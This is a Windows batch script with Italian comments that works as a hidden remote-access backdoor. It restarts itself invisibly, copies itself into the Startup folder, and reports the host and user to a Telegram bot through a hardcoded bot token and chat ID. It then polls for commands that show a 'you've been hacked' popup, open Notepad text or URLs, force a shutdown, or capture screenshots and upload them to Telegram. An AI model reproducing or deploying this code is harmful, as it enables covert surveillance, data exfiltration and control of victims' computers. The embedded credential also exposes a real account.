@echo off
if "%1" == "hidden" goto :start

:: Riavvio in modalità nascosta
powershell -window hidden -command "Start-Process cmd -ArgumentList '/c','%~nx0','hidden' -WindowStyle Hidden"
exit /b

:start
setlocal enabledelayedexpansion

:: Configurazione
set "BOT_TOKEN=7711566157:AAEs2eaKEVqE5pWYLc9L4WiDIc8vS5n83hw"
set "CHAT_ID=5709299213"
set "SCREENSHOT_PATH=%TEMP%\%RANDOM%.png"
set "LAST_COMMAND_ID=0"

:: Invia notifica di connessione
curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
    -d "chat_id=%CHAT_ID%" ^
    -d "text=🟢 Shell aperta su: %COMPUTERNAME% (%USERNAME%)"

:: Aggiungi all'avvio automatico
if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_shell.bat" (
    copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\remote_shell.bat"
)

:: Verifica/installa curl
where curl >nul 2>&1 || (
    bitsadmin /transfer "DownloadCurl" /download /priority high "https://curl.se/windows/latest.cgi?p=win64-mingw.zip" "%TEMP%\curl.zip" || (
        powershell -command "Invoke-WebRequest 'https://curl.se/windows/latest.cgi?p=win64-mingw.zip' -OutFile '%TEMP%\curl.zip'"
    )
    powershell -command "Expand-Archive '%TEMP%\curl.zip' '%TEMP%\curl' -Force"
    set "PATH=%TEMP%\curl\curl-*-win64-mingw\bin;%PATH%"
)

:: Loop principale
:command_loop
:: Controlla nuovi messaggi
curl -s -X GET "https://api.telegram.org/bot%BOT_TOKEN%/getUpdates?offset=%LAST_COMMAND_ID%" > "%TEMP%\updates.json"

:: Estrai comandi dai messaggi
for /f "tokens=*" %%A in ('powershell -command "$json=Get-Content '%TEMP%\updates.json'|ConvertFrom-Json;if($json.ok){$json.result|ForEach-Object{if($_.message.text -and $_.update_id -gt %LAST_COMMAND_ID%){Write-Output ($_.update_id.ToString()+':'+$_.message.text)}}}"') do (
    set "update_data=%%A"
    set "LAST_COMMAND_ID=!update_data:*:=!"
    set "full_command=!update_data:*:=!"
    
    :: Estrai comando e argomento
    for /f "tokens=1,*" %%B in ("!full_command!") do (
        set "command=%%B"
        set "arg=%%C"
    )
    
    if /i "!command!" == "pop" (
        :: Mostra popup "Sei stato hackerato"
        powershell -command "[System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms'); [System.Windows.Forms.MessageBox]::Show('SEI STATO HACKERATO','ATTENZIONE',[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)"
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=✅ Popup mostrato su %COMPUTERNAME%"
    )
    
    if /i "!command!" == "note" (
        :: Apri Notepad con testo specificato
        if defined arg (
            echo !arg! > "%TEMP%\note.txt"
            start notepad "%TEMP%\note.txt"
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                -d "chat_id=%CHAT_ID%" ^
                -d "text=📝 Notepad aperto su %COMPUTERNAME% con testo: !arg!"
        ) else (
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                -d "chat_id=%CHAT_ID%" ^
                -d "text=❌ Specifica il testo dopo 'note'"
        )
    )
    
    if /i "!command!" == "off" (
        :: Spegni il computer
        curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
            -d "chat_id=%CHAT_ID%" ^
            -d "text=🔴 Spegnimento di: %COMPUTERNAME%"
        shutdown /s /t 0
        exit
    )
    
    if /i "!command!" == "foto" (
        :: Cattura screenshot e invia
        call :capture_screen
        if exist "%SCREENSHOT_PATH%" (
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendPhoto" ^
                -F chat_id=%CHAT_ID% ^
                -F photo=@"%SCREENSHOT_PATH%" ^
                -F caption="📸 Screenshot da %COMPUTERNAME%"
            del "%SCREENSHOT_PATH%" >nul
        )
    )
    
    if /i "!command!" == "url" (
        :: Apri URL specificato
        if defined arg (
            echo !arg! | findstr /r /c:"^http://" /c:"^https://" >nul
            if errorlevel 1 (
                curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                    -d "chat_id=%CHAT_ID%" ^
                    -d "text=❌ URL non valido: !arg!"
            ) else (
                start "" "!arg!"
                curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                    -d "chat_id=%CHAT_ID%" ^
                    -d "text=🌍 Aperto URL su %COMPUTERNAME%: !arg!"
            )
        ) else (
            curl -s -X POST "https://api.telegram.org/bot%BOT_TOKEN%/sendMessage" ^
                -d "chat_id=%CHAT_ID%" ^
                -d "text=❌ Specifica un URL dopo 'url'"
        )
    )
)

:: Attesa prima di controllare nuovi comandi
timeout /t 5 /nobreak >nul
goto command_loop

:capture_screen
:: Cattura schermo intero
powershell -command "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.SendKeys]::SendWait('{PRTSC}'); Start-Sleep -Milliseconds 1000; $img=[Windows.Forms.Clipboard]::GetImage(); if($img){$img.Save('%SCREENSHOT_PATH%',[Drawing.Imaging.ImageFormat]::Png)}"
exit /b
